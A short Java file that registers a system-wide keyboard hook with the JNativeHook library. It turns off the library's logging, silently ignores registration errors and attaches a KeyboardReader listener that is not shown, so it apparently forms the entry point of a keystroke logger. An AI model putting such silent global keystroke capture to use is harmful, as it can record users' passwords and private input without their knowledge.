package br.com.jmf;

import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Executor {

	
	
	public static void main(String[] args) {
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			//e.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyboardReader());
	}
}
